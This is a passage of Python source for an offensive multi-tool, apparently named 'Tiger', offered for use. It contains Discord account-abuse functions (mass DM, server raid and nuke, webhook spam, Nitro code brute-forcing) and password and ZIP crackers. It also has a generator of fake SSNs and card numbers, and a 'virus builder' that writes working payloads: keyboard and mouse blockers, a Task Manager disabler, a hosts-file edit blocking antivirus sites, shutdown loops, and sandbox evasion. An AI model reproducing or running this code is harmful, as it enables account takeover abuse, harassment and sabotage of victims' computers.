    friends=requests.get("https://discord.com/api/v9/users/@me/relationships",headers=h).json()
    if not isinstance(friends,list): print(f"{ERR} Invalid."); pause(); return
    for f in friends:
        if f.get("type")==1:
            uid=f.get("user",{}).get("id")
            r=requests.put(f"https://discord.com/api/v9/users/@me/relationships/{uid}",headers=h,json={"type":2})
            print(f"  {R}[BLOCKED]{RST} {f.get('user',{}).get('username','?')} ({r.status_code})"); time.sleep(0.3)
    pause()

def disc_mass_dm():
    banner_s("MASS DM")
    token=input(f"  {W}Token: {RST}").strip()
    message=input(f"  {W}Message: {RST}").strip()
    ids_raw=input(f"  {W}User IDs (comma): {RST}").strip()
    user_ids=[u.strip() for u in ids_raw.split(",") if u.strip()]
    h=_dh(token); print()
    for uid in user_ids:
        try:
            dm=requests.post("https://discord.com/api/v9/users/@me/channels",headers=h,json={"recipient_id":uid})
            if dm.status_code==200:
                cid=dm.json()["id"]
                msg=requests.post(f"https://discord.com/api/v9/channels/{cid}/messages",headers=h,json={"content":message})
                col=G if msg.status_code==200 else R; print(f"  {col}[{uid}]{RST} -> {msg.status_code}")
            else: print(f"  {R}[{uid}]{RST} DM failed ({dm.status_code})")
        except Exception as e: print(f"  {R}[{uid}]{RST} {e}")
        time.sleep(0.6)
    pause()

def disc_delete_dm():
    banner_s("TOKEN DELETE DM")
    token=input(f"  {W}Token: {RST}").strip(); h=_dh(token)
    dms=requests.get("https://discord.com/api/v9/users/@me/channels",headers=h).json()
    if not isinstance(dms,list): print(f"{ERR} Invalid."); pause(); return
    print(f"{OK} Found {len(dms)} DM channels.")
    for dm in dms:
        cid=dm.get("id")
        r=requests.delete(f"https://discord.com/api/v9/channels/{cid}",headers=h)
        name=dm.get("recipients",[{}])[0].get("username","?") if dm.get("recipients") else "group"
        print(f"  {R}[DEL]{RST} {name} ({r.status_code})"); time.sleep(0.3)
    pause()

def disc_server_raid():
    banner_s("TOKEN SERVER RAID")
    token=input(f"  {W}Token: {RST}").strip()
    gid=input(f"  {W}Server ID to raid: {RST}").strip()
    channel=input(f"  {W}Channel ID to spam: {RST}").strip()
    message=input(f"  {W}Raid message: {RST}").strip()
    count=int(input(f"  {W}Message count: {RST}").strip() or "20")
    h=_dh(token); print()
    # create channels
    for i in range(3):
        r=requests.post(f"https://discord.com/api/v9/guilds/{gid}/channels",headers=h,
                        json={"name":f"raided-by-tiger-{i}","type":0})
        print(f"  {Y}[CHANNEL]{RST} create ({r.status_code})")
        time.sleep(0.4)
    # spam
    for i in range(1,count+1):
        r=requests.post(f"https://discord.com/api/v9/channels/{channel}/messages",headers=h,json={"content":f"@everyone {message}"})
        col=G if r.status_code==200 else R; print(f"  {col}[{i}/{count}]{RST} {r.status_code}"); time.sleep(0.3)
    pause()

def disc_token_gen():
    banner_s("TOKEN GENERATOR")
    count=int(input(f"  {W}Count: {RST}").strip() or "10")
    chars=string.ascii_letters+string.digits+"-_"; print(); tokens=[]
    for _ in range(count):
        p1=base64.b64encode(str(random.randint(100000000000000000,999999999999999999)).encode()).decode().rstrip("=")
        p2="".join(random.choices(chars,k=6)); p3="".join(random.choices(chars,k=27))
        tok=f"{p1}.{p2}.{p3}"; print(f"  {Y}{tok}{RST}"); tokens.append(tok)
    save_out("tokens_gen.txt","\n".join(tokens)); pause()

def disc_webhook_info():
    banner_s("WEBHOOK INFO")
    wh=input(f"  {W}Webhook URL: {RST}").strip()
    d=jget(wh); print(); pkv(d); pause()

def disc_webhook_delete():
    banner_s("WEBHOOK DELETE")
    wh=input(f"  {W}Webhook URL: {RST}").strip()
    r=requests.delete(wh); print(f"\n{OK if r.status_code==204 else ERR} {r.status_code}"); pause()

def disc_webhook_spammer():
    banner_s("WEBHOOK SPAMMER")
    wh=input(f"  {W}Webhook URL: {RST}").strip()
    message=input(f"  {W}Message: {RST}").strip()
    count=int(input(f"  {W}Count: {RST}").strip() or "10")
    delay=float(input(f"  {W}Delay (s): {RST}").strip() or "0.5")
    print()
    for i in range(1,count+1):
        r=requests.post(wh,json={"content":message})
        col=G if r.status_code==204 else R; print(f"  {col}[{i}/{count}]{RST}  {r.status_code}"); time.sleep(delay)
    pause()

def disc_webhook_gen():
    banner_s("WEBHOOK GENERATOR")
    token=input(f"  {W}Token: {RST}").strip()
    channel=input(f"  {W}Channel ID: {RST}").strip()
    name=input(f"  {W}Webhook name: {RST}").strip() or "Tiger"
    count=int(input(f"  {W}Count to create: {RST}").strip() or "3")
    h=_dh(token); print(); hooks=[]
    for i in range(count):
        r=requests.post(f"https://discord.com/api/v9/channels/{channel}/webhooks",headers=h,json={"name":f"{name}-{i}"})
        if r.status_code==200:
            url=r.json().get("url","?"); print(f"  {G}[CREATED]{RST} {url}"); hooks.append(url)
        else: print(f"  {R}[FAIL]{RST} {r.status_code}")
        time.sleep(0.4)
    if hooks: save_out("webhooks_created.txt","\n".join(hooks))
    pause()

def disc_bot_nuker():
    banner_s("SERVER NUKER (BOT TOKEN)")
    token=input(f"  {W}Bot Token: {RST}").strip()
    gid=input(f"  {W}Server/Guild ID: {RST}").strip()
    h={"Authorization":f"Bot {token}","Content-Type":"application/json"}
    if input(f"\n  {R}[!]{RST} Type {BRT}NUKE{RST} to confirm: ")!="NUKE": pause(); return
    # delete channels
    channels=requests.get(f"https://discord.com/api/v9/guilds/{gid}/channels",headers=h).json()
    if isinstance(channels,list):
        for ch in channels:
            r=requests.delete(f"https://discord.com/api/v9/channels/{ch['id']}",headers=h)
            print(f"  {R}[DEL CHANNEL]{RST} {ch.get('name','?')} ({r.status_code})"); time.sleep(0.3)
    # create spam channels
    for i in range(5):
        requests.post(f"https://discord.com/api/v9/guilds/{gid}/channels",headers=h,json={"name":f"nuked-by-tiger-{i}","type":0})
        time.sleep(0.3)
    # delete roles
    roles=requests.get(f"https://discord.com/api/v9/guilds/{gid}/roles",headers=h).json()
    if isinstance(roles,list):
        for role in roles:
            if not role.get("managed"):
                requests.delete(f"https://discord.com/api/v9/guilds/{gid}/roles/{role['id']}",headers=h); time.sleep(0.2)
    print(f"\n{OK} Server nuked."); pause()

def disc_server_info():
    banner_s("SERVER INFO")
    token=input(f"  {W}Token: {RST}").strip()
    gid=input(f"  {W}Server ID: {RST}").strip()
    d=requests.get(f"https://discord.com/api/v9/guilds/{gid}?with_counts=true",headers=_dh(token)).json()
    if "code" in d: print(f"{ERR} {d.get('message')}"); pause(); return
    print(f"\n  {Y}Name      {RST}: {W}{d.get('name')}{RST}")
    print(f"  {Y}Owner     {RST}: {W}{d.get('owner_id')}{RST}")
    print(f"  {Y}Members   {RST}: {W}{d.get('approximate_member_count','?')}{RST}")
    print(f"  {Y}Online    {RST}: {W}{d.get('approximate_presence_count','?')}{RST}")
    print(f"  {Y}Boost Lvl {RST}: {W}{d.get('premium_tier')}{RST}")
    print(f"  {Y}Boosts    {RST}: {W}{d.get('premium_subscription_count',0)}{RST}")
    save_out(f"server_{gid}.txt",json.dumps(d,indent=2)); pause()

def disc_nitro_gen():
    banner_s("NITRO GENERATOR")
    count=int(input(f"  {W}Count: {RST}").strip() or "10")
    check=input(f"  {W}Check? (y/n): {RST}").strip().lower()=="y"
    chars=string.ascii_letters+string.digits; print(); valid=[]
    for i in range(1,count+1):
        code="".join(random.choices(chars,k=16)); url=f"https://discord.gift/{code}"
        if check:
            r=requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}",timeout=4)
            ok=r.status_code==200; tag=f"{G}[VALID]{RST}" if ok else f"{R}[INVALID]{RST}"
            print(f"  {tag}  {url}");
            if ok: valid.append(url)
        else: print(f"  {Y}[GEN]{RST}   {url}"); valid.append(url)
        time.sleep(0.15)
    save_out("nitro_gen.txt","\n".join(valid)); pause()

def disc_friend_spammer():
    banner_s("FRIEND SPAMMER")
    token=input(f"  {W}Token: {RST}").strip(); h=_dh(token)
    friends=requests.get("https://discord.com/api/v9/users/@me/relationships",headers=h).json()
    if not isinstance(friends,list): print(f"{ERR} Invalid."); pause(); return
    message=input(f"  {W}Message to send to all friends: {RST}").strip()
    print()
    for f in friends:
        if f.get("type")==1:
            uid=f.get("user",{}).get("id")
            try:
                dm=requests.post("https://discord.com/api/v9/users/@me/channels",headers=h,json={"recipient_id":uid})
                if dm.status_code==200:
                    cid=dm.json()["id"]
                    msg=requests.post(f"https://discord.com/api/v9/channels/{cid}/messages",headers=h,json={"content":message})
                    print(f"  {G}[DM]{RST} {f.get('user',{}).get('username','?')} -> {msg.status_code}")
            except Exception as e: print(f"  {R}[ERR]{RST} {e}")
            time.sleep(0.6)
    pause()

def disc_channel_spammer():
    banner_s("CHANNEL SPAMMER")
    token=input(f"  {W}Token: {RST}").strip()
    channel=input(f"  {W}Channel ID: {RST}").strip()
    msgs_raw=input(f"  {W}Messages (comma sep, blank=default): {RST}").strip()
    msgs=[m.strip() for m in msgs_raw.split(",") if m.strip()] or ["@everyone","tiger tools","RAIDED"]
    count=int(input(f"  {W}Total sends: {RST}").strip() or "20")
    delay=float(input(f"  {W}Delay (s): {RST}").strip() or "0.3")
    h=_dh(token); print()
    for i in range(1,count+1):
        msg=random.choice(msgs)
        r=requests.post(f"https://discord.com/api/v9/channels/{channel}/messages",headers=h,json={"content":msg})
        col=G if r.status_code==200 else R; print(f"  {col}[{i}/{count}]{RST}  {r.status_code}  {DIM}{msg[:30]}{RST}"); time.sleep(delay)
    pause()

def disc_reaction_spammer():
    banner_s("REACTION SPAMMER")
    token=input(f"  {W}Token: {RST}").strip()
    channel=input(f"  {W}Channel ID: {RST}").strip()
    msg_id=input(f"  {W}Message ID: {RST}").strip()
    emoji=input(f"  {W}Emoji: {RST}").strip()
    count=int(input(f"  {W}Count: {RST}").strip() or "10")
    h=_dh(token); import urllib.parse; enc=urllib.parse.quote(emoji); print()
    for i in range(1,count+1):
        r=requests.put(f"https://discord.com/api/v9/channels/{channel}/messages/{msg_id}/reactions/{enc}/@me",headers=h)
        col=G if r.status_code==204 else R; print(f"  {col}[{i}/{count}]{RST}  {r.status_code}"); time.sleep(0.3)
    pause()

def disc_guilds():
    banner_s("GUILD LIST")
    token=input(f"  {W}Token: {RST}").strip()
    r=requests.get("https://discord.com/api/v9/users/@me/guilds",headers=_dh(token))
    if r.status_code!=200: print(f"{ERR} {r.status_code}"); pause(); return
    print(); lines=[]
    for g in r.json():
        owner=f"{G}[OWNER]{RST}" if g.get("owner") else f"{DIM}[MBR]  {RST}"
        print(f"  {owner}  {W}{g.get('name'):<30}{RST}  {DIM}{g.get('id')}{RST}")
        lines.append(f"{'[OWNER]' if g.get('owner') else '[MEMBER]'} {g.get('name')} ({g.get('id')})")
    save_out("disc_guilds.txt","\n".join(lines)); pause()

def disc_friends():
    banner_s("FRIEND LIST")
    token=input(f"  {W}Token: {RST}").strip()
    r=requests.get("https://discord.com/api/v9/users/@me/relationships",headers=_dh(token))
    if r.status_code!=200: print(f"{ERR} {r.status_code}"); pause(); return
    print(); lines=[]
    for f in r.json():
        u=f.get("user",{}); rtype={1:"Friend",2:"Blocked",3:"Incoming",4:"Outgoing"}.get(f.get("type"),"?")
        print(f"  {G}[{rtype}]{RST}  {W}{u.get('username')}#{u.get('discriminator','0')}{RST}  {DIM}{u.get('id')}{RST}")
        lines.append(f"[{rtype}] {u.get('username')}#{u.get('discriminator','0')} ({u.get('id')})")
    save_out("disc_friends.txt","\n".join(lines)); pause()

# ================================================================
# 4 - UTILITIES
# ================================================================
def util_menu():
    while True:
        opts=[("1","Password Hasher"),("2","Password Generator"),
              ("3","IP Generator"),("4","Base64 Encode/Decode"),
              ("5","XOR Encrypt/Decrypt"),("6","Fake Identity Generator"),
              ("7","Hash Cracker (wordlist)"),("8","Dark Web Links"),
              ("9","Search In Database (links)"),("10","Text Converter (Bin/Hex)"),
              ("11","JWT Decoder"),("12","Password Zip Crack"),
              ("0","Back")]
        menu_box("UTILITIES",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": util_hasher()
        elif c=="2": util_passgen()
        elif c=="3": util_ipgen()
        elif c=="4": util_b64()
        elif c=="5": util_xor()
        elif c=="6": util_fake_id()
        elif c=="7": util_hash_crack()
        elif c=="8": util_darkweb()
        elif c=="9": util_db_search()
        elif c=="10": util_text_conv()
        elif c=="11": util_jwt()
        elif c=="12": util_zip_crack()
        elif c=="0": break

def util_hasher():
    banner_s("PASSWORD HASHER")
    text=input(f"  {W}Text: {RST}").strip(); print()
    for a in ["md5","sha1","sha224","sha256","sha384","sha512","sha3_256","blake2b","blake2s"]:
        h=hashlib.new(a,text.encode()).hexdigest(); print(f"  {Y}{a:<12}{RST}  {W}{h}{RST}")
    pause()

def util_passgen():
    banner_s("PASSWORD GENERATOR")
    length=int(input(f"  {W}Length (16): {RST}").strip() or "16")
    count=int(input(f"  {W}Count (10): {RST}").strip() or "10")
    sym=input(f"  {W}Symbols? (y/n): {RST}").strip().lower()!="n"
    pool=string.ascii_letters+string.digits
    if sym: pool+="!@#$%^&*()-_=+[]{}|;:,.<>?"
    print(); pws=[]
    for _ in range(count):
        pw="".join(random.choices(pool,k=length)); print(f"  {G}->{RST} {W}{pw}{RST}"); pws.append(pw)
    save_out("passwords.txt","\n".join(pws)); pause()

def util_ipgen():
    banner_s("IP GENERATOR")
    count=int(input(f"  {W}Count: {RST}").strip() or "10"); ips=[]; print()
    for _ in range(count):
        ip=".".join(str(random.randint(1,254)) for _ in range(4)); print(f"  {G}->{RST} {W}{ip}{RST}"); ips.append(ip)
    save_out("ips.txt","\n".join(ips)); pause()

def util_b64():
    banner_s("BASE64")
    mode=input(f"  {W}(e)ncode/(d)ecode: {RST}").strip().lower()
    text=input(f"  {W}Input: {RST}").strip()
    if mode=="e": out=base64.b64encode(text.encode()).decode(); print(f"\n{OK} {G}{out}{RST}")
    else:
        try: out=base64.b64decode(text).decode(); print(f"\n{OK} {G}{out}{RST}")
        except Exception as e: print(f"{ERR} {e}")
    pause()

def util_xor():
    banner_s("XOR ENCRYPT/DECRYPT")
    text=input(f"  {W}Text: {RST}").strip(); key=input(f"  {W}Key: {RST}").strip()
    if not key: print(f"{ERR} Need key."); pause(); return
    out="".join(chr(ord(c)^ord(key[i%len(key)])) for i,c in enumerate(text))
    b64=base64.b64encode(out.encode("latin-1")).decode(); print(f"\n{OK} Result (b64): {G}{b64}{RST}"); pause()

def util_fake_id():
    banner_s("FAKE IDENTITY GENERATOR")
    fm=["James","Michael","David","Chris","Alex","Ryan","Jake","Ethan","Noah","Liam"]
    ff=["Emma","Olivia","Sophia","Ava","Isabella","Mia","Charlotte","Lily","Grace","Zoe"]
    last=["Smith","Johnson","Williams","Jones","Brown","Davis","Miller","Wilson","Moore","Taylor"]
    domains=["gmail.com","yahoo.com","hotmail.com","outlook.com","protonmail.com"]
    g=random.choice(["M","F"]); fn=random.choice(fm if g=="M" else ff); ln=random.choice(last)
    yr=random.randint(1985,2004); mo=random.randint(1,12); dy=random.randint(1,28)
    email=f"{fn.lower()}.{ln.lower()}{random.randint(10,99)}@{random.choice(domains)}"
    phone=f"+1{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
    ip=".".join(str(random.randint(1,254)) for _ in range(4))
    pw="".join(random.choices(string.ascii_letters+string.digits+"!@#$",k=12))
    ssn=f"{random.randint(100,999)}-{random.randint(10,99)}-{random.randint(1000,9999)}"
    cc_n=f"4{''.join(str(random.randint(0,9)) for _ in range(15))}"
    cc_exp=f"{random.randint(1,12):02d}/{random.randint(25,30)}"
    cc_cvv=str(random.randint(100,999))
    print(f"""
  {Y}Name    {RST}: {W}{fn} {ln}{RST}    {Y}Gender  {RST}: {W}{g}{RST}
  {Y}DOB     {RST}: {W}{yr}-{mo:02d}-{dy:02d}{RST}    {Y}SSN     {RST}: {W}{ssn}{RST}
  {Y}Email   {RST}: {W}{email}{RST}
  {Y}Phone   {RST}: {W}{phone}{RST}    {Y}IP      {RST}: {W}{ip}{RST}
  {Y}Password{RST}: {W}{pw}{RST}
  {Y}Card    {RST}: {W}{cc_n}  {cc_exp}  CVV:{cc_cvv}{RST}
""")
    save_out(f"fake_id_{fn}_{ln}.txt",f"Name:{fn} {ln}\nDOB:{yr}-{mo:02d}-{dy:02d}\nEmail:{email}\nPhone:{phone}\nIP:{ip}\nPW:{pw}\nSSN:{ssn}\nCard:{cc_n} {cc_exp} {cc_cvv}")
    pause()

def util_hash_crack():
    banner_s("HASH CRACKER")
    target=input(f"  {W}Hash: {RST}").strip().lower()
    wlist=input(f"  {W}Wordlist (blank=built-in): {RST}").strip()
    builtin=["password","123456","admin","qwerty","letmein","welcome","monkey","dragon",
             "master","abc123","pass","test","1234","iloveyou","sunshine","princess",
             "football","shadow","batman","superman","111111","000000","azerty","soleil",
             "password1","123456789","12345678","1234567890","0987654321"]
    words=builtin
    if wlist and os.path.isfile(wlist):
        with open(wlist,encoding="utf-8",errors="ignore") as f: words=[l.strip() for l in f]
        print(f"{OK} {len(words)} words loaded.")
    print(f"\n{INF} Cracking...\n"); cracked=False
    for word in words:
        for algo in ["md5","sha1","sha256","sha512"]:
            if hashlib.new(algo,word.encode()).hexdigest()==target:
                print(f"\n{OK} {G}CRACKED{RST}: {BRT}{word}{RST}  ({algo})"); cracked=True; break
        if cracked: break
    if not cracked: print(f"{ERR} Not found.")
    pause()

def util_darkweb():
    banner_s("DARK WEB LINKS")
    print(f"\n  {R}[!]{RST} {DIM}Requires Tor Browser to access .onion links.{RST}\n")
    links=[
        ("Torch Search",     "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion"),
        ("Ahmia (clearnet)", "https://ahmia.fi/"),
        ("DuckDuckGo (Tor)", "https://3g2upl4pq6kufc4m.onion"),
        ("The Hidden Wiki",  "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki/"),
        ("ProPublica",       "https://www.propub3r6espa33w.onion"),
        ("SecureDrop",       "http://sdolvtfhatvsysc6l34d65ymdwxcujausv7k5jk4cy5ttzhjoi6fzvyd.onion"),
    ]
    for name,url in links: print(f"  {G}{name:<20}{RST}  {DIM}{url}{RST}")
    save_out("darkweb_links.txt","\n".join(f"{n}: {u}" for n,u in links)); pause()

def util_db_search():
    banner_s("SEARCH IN DATABASE")
    query=input(f"  {W}Email/username/phone to search: {RST}").strip()
    print(f"\n  {Y}Database leak search links:{RST}\n")
    sites=[("HaveIBeenPwned",f"https://haveibeenpwned.com/account/{query}"),
           ("DeHashed",f"https://dehashed.com/search?query={query}"),
           ("LeakCheck",f"https://leakcheck.io/?query={query}"),
           ("Snusbase","https://snusbase.com/"),
           ("IntelX",f"https://intelx.io/?s={query}"),
           ("Breach Directory",f"https://breachdirectory.org/?q={query}")]
    for name,url in sites: print(f"  {G}[{name}]{RST}  {DIM}{url}{RST}")
    save_out(f"db_search_{query[:20]}.txt","\n".join(f"{n}: {u}" for n,u in sites)); pause()

def util_text_conv():
    banner_s("TEXT CONVERTER")
    print(f"  {Y}[1]{RST} Text->Binary  {Y}[2]{RST} Text->Hex  {Y}[3]{RST} Binary->Text  {Y}[4]{RST} Hex->Text")
    mode=input(f"  {W}Mode: {RST}").strip()
    text=input(f"  {W}Input: {RST}").strip()
    if mode=="1": out=" ".join(format(ord(c),"08b") for c in text)
    elif mode=="2": out=" ".join(format(ord(c),"02x") for c in text)
    elif mode=="3":
        try: out="".join(chr(int(b,2)) for b in text.split())
        except: out="Error: invalid binary"
    elif mode=="4":
        try: out=bytes.fromhex(text.replace(" ","")).decode()
        except: out="Error: invalid hex"
    else: out="Invalid mode"
    print(f"\n{OK} {G}{out}{RST}"); pause()

def util_jwt():
    banner_s("JWT DECODER")
    token=input(f"  {W}JWT: {RST}").strip()
    parts=token.split(".")
    if len(parts)!=3: print(f"{ERR} Invalid JWT."); pause(); return
    try:
        def dp(p):
            p+=("="*(4-len(p)%4))%4
            return json.loads(base64.b64decode(p).decode())
        h=dp(parts[0]); pl=dp(parts[1])
        print(f"\n  {Y}HEADER:{RST}"); pkv(h,1)
        print(f"\n  {Y}PAYLOAD:{RST}"); pkv(pl,1)
        print(f"\n  {Y}SIG:{RST}\n  {DIM}{parts[2]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()

def util_zip_crack():
    banner_s("PASSWORD ZIP CRACK")
    zip_path=input(f"  {W}ZIP file path: {RST}").strip()
    wlist=input(f"  {W}Wordlist path (blank=built-in): {RST}").strip()
    try: import zipfile
    except: print(f"{ERR} zipfile not available."); pause(); return
    if not os.path.isfile(zip_path): print(f"{ERR} ZIP not found."); pause(); return
    builtin=["password","123456","admin","qwerty","1234","12345","123456789","letmein","abc123","password1","iloveyou","0000","1111","9999"]
    words=builtin
    if wlist and os.path.isfile(wlist):
        with open(wlist,encoding="utf-8",errors="ignore") as f: words=[l.strip() for l in f]
        print(f"{OK} {len(words)} words loaded.")
    print(f"\n{INF} Cracking {zip_path}...\n")
    try:
        zf=zipfile.ZipFile(zip_path)
        for word in words:
            try:
                zf.extractall(pwd=word.encode())
                print(f"\n{OK} {G}PASSWORD FOUND{RST}: {BRT}{word}{RST}")
                save_out(f"zip_cracked_{os.path.basename(zip_path)}.txt",f"File:{zip_path}\nPassword:{word}")
                pause(); return
            except: pass
        print(f"{ERR} Password not found in wordlist.")
    except Exception as e: print(f"{ERR} {e}")
    pause()

# ================================================================
# 5 - VIRUS BUILDER
# ================================================================
def builder_menu():
    while True:
        opts=[("1","Full Stealer (Tokens+Passwords+Cards+Cookies+WiFi+Wallets+Screenshot)"),
              ("2","Malware Builder"),("3","Fake Error"),
              ("4","Startup Persistence"),("5","Fork Bomb"),
              ("6","Reverse Shell"),("7","AV Bypass Stub"),
              ("8","Ransomware Note"),("9","USB Spreader"),
              ("0","Back")]
        menu_box("VIRUS BUILDER",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": builder_stealer()
        elif c=="2": builder_malware_menu()
        elif c=="3": builder_fake_error()
        elif c=="4": builder_startup()
        elif c=="5": builder_forkbomb()
        elif c=="6": builder_revshell()
        elif c=="7": builder_av_bypass()
        elif c=="8": builder_ransom_note()
        elif c=="9": builder_usb_spreader()
        elif c=="0": break

def builder_malware_menu():
    while True:
        opts=[("1","Block Key"),("2","Block Mouse"),("3","Block Task Manager"),
              ("4","Block AV Websites"),("5","Shutdown"),("6","Spam Open Program"),
              ("7","Spam Create File"),("8","Anti VM + Debug"),
              ("9","Restart Every 5min"),("0","Back")]
        menu_box("MALWARE BUILDER",opts)
        c=input(f"  {R}>{RST} ").strip()
        if c=="1": mal_block_key()
        elif c=="2": mal_block_mouse()
        elif c=="3": builder_block_taskmgr()
        elif c=="4": mal_block_av()
        elif c=="5": mal_shutdown()
        elif c=="6": mal_spam_program()
        elif c=="7": mal_spam_file()
        elif c=="8": mal_anti_vm()
        elif c=="9": mal_restart_loop()
        elif c=="0": break

def mal_block_key():
    banner_s("BLOCK KEY")
    code=r'''import ctypes, sys
# Block all keyboard input on Windows
user32 = ctypes.WinDLL('user32', use_last_error=True)
LLKHF_INJECTED = 0x10

import ctypes.wintypes as wt
WH_KEYBOARD_LL = 13

def low_level_handler(nCode, wParam, lParam):
    return 1  # block all keys

HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wt.WPARAM, wt.LPARAM)
hook_proc = HOOKPROC(low_level_handler)
hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, None, 0)

import win32gui, win32con
msg = wt.MSG()
while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
    user32.TranslateMessage(ctypes.byref(msg))
    user32.DispatchMessageW(ctypes.byref(msg))
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/block_key.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_key.py{RST}"); pause()

def mal_block_mouse():
    banner_s("BLOCK MOUSE")
    code=r'''import ctypes, time
# Freeze mouse in center of screen
user32 = ctypes.windll.user32
sw = user32.GetSystemMetrics(0)
sh = user32.GetSystemMetrics(1)
cx, cy = sw//2, sh//2
print("[+] Mouse blocked. Ctrl+C in terminal to stop.")
while True:
    user32.SetCursorPos(cx, cy)
    time.sleep(0.01)
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/block_mouse.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_mouse.py{RST}"); pause()

def builder_block_taskmgr():
    banner_s("BLOCK TASK MANAGER")
    code=r'''import winreg
k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,
    r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
    0,winreg.KEY_SET_VALUE)
winreg.SetValueEx(k,"DisableTaskMgr",0,winreg.REG_DWORD,1)
winreg.CloseKey(k)
print("[+] Task Manager blocked.")
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/block_taskmgr.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_taskmgr.py{RST}"); pause()

def mal_block_av():
    banner_s("BLOCK AV WEBSITES")
    code=r'''import os, platform
if platform.system() != "Windows":
    print("[-] Windows only.")
    exit()

av_sites = [
    "virustotal.com","malwarebytes.com","avast.com","avg.com",
    "norton.com","kaspersky.com","bitdefender.com","mcafee.com",
    "eset.com","sophos.com","trendmicro.com","webroot.com",
]
hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
try:
    with open(hosts_path, "a") as f:
        for site in av_sites:
            f.write(f"\n127.0.0.1 {site}")
            f.write(f"\n127.0.0.1 www.{site}")
    print(f"[+] Blocked {len(av_sites)} AV sites in hosts file.")
except PermissionError:
    print("[-] Need admin rights to edit hosts file.")
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/block_av.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_av.py{RST}"); pause()

def mal_shutdown():
    banner_s("SHUTDOWN")
    delay=input(f"  {W}Delay in seconds (0=immediate): {RST}").strip() or "0"
    code=f'''import os, platform, time
time.sleep({delay})
if platform.system()=="Windows": os.system("shutdown /s /t 0")
else: os.system("shutdown -h now")
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/shutdown.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/shutdown.py{RST}"); pause()

def mal_spam_program():
    banner_s("SPAM OPEN PROGRAM")
    prog=input(f"  {W}Program path (e.g. C:\\\\Windows\\\\notepad.exe): {RST}").strip() or "notepad.exe"
    count=input(f"  {W}How many times to open: {RST}").strip() or "50"
    code=f'''import subprocess, time
PROGRAM = r"{prog}"
COUNT = {count}
for i in range(COUNT):
    try: subprocess.Popen([PROGRAM])
    except Exception as e: print(f"[-] {{e}}")
    time.sleep(0.1)
print(f"[+] Opened {{COUNT}} times.")
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/spam_program.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/spam_program.py{RST}"); pause()

def mal_spam_file():
    banner_s("SPAM CREATE FILE")
    folder=input(f"  {W}Folder to spam (e.g. C:\\\\Users\\\\Public): {RST}").strip() or "C:\\Users\\Public"
    count=input(f"  {W}File count: {RST}").strip() or "500"
    code=f'''import os, random, string
FOLDER = r"{folder}"
COUNT = {count}
os.makedirs(FOLDER, exist_ok=True)
for i in range(COUNT):
    name = "".join(random.choices(string.ascii_lowercase, k=8)) + ".txt"
    path = os.path.join(FOLDER, name)
    with open(path, "w") as f:
        f.write("tiger" * 1000)
print(f"[+] Created {{COUNT}} files in {{FOLDER}}")
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/spam_file.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/spam_file.py{RST}"); pause()

def mal_anti_vm():
    banner_s("ANTI VM + DEBUG")
    code=r'''import os, platform, sys, subprocess, socket

def check_vm():
    fails = []

    # CPU check
    if platform.processor() == "":
        fails.append("empty processor")

    # hostname check
    bad_hosts = ["sandbox","virus","malware","cuckoo","triage","any.run","cape","vmware","vbox"]
    hn = socket.gethostname().lower()
    if any(b in hn for b in bad_hosts):
        fails.append(f"bad hostname: {hn}")

    # user check
    try:
        user = os.getlogin().lower()
        bad_users = ["sandbox","virus","malware","admin","user","test","analysis"]
        if user in bad_users:
            fails.append(f"bad user: {user}")
    except: pass

    # process check
    if platform.system() == "Windows":
        try:
            out = subprocess.run(["tasklist"], capture_output=True, text=True).stdout.lower()
            bad_procs = ["wireshark","procmon","processhacker","ollydbg","x64dbg","ida","ghidra","fiddler","burpsuite"]
            for p in bad_procs:
                if p in out:
                    fails.append(f"bad process: {p}")
        except: pass

    # file check
    vm_files = [
        r"C:\analysis\agent.py",
        r"C:\windows\system32\drivers\vmmouse.sys",
        r"C:\windows\system32\drivers\vmhgfs.sys",
        r"C:\windows\system32\VBoxService.exe",
    ]
    for vf in vm_files:
        if os.path.isfile(vf):
            fails.append(f"VM file: {vf}")

    return fails

issues = check_vm()
if issues:
    print(f"[-] VM/Sandbox detected: {issues}")
    sys.exit(0)
else:
    print("[+] Environment looks clean. Proceeding...")
    # put your payload here
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/anti_vm.py","w",encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/anti_vm.py{RST}"); pause()

def mal_restart_loop():
    banner_s("RESTART EVERY 5MIN")
    code=r'''import os, platform, time

print("[+] Restart loop active. Every 5 minutes.")
while True:
    time.sleep(300)
    if platform.system() == "Windows":
        os.system("shutdown /r /t 0")
    else:
        os.system("reboot")
'''
    os.makedirs("1-Output",exist_ok=True)
    with open("1-Output/restart_loop.py","w",encoding="utf-8") as f: f.write(code)
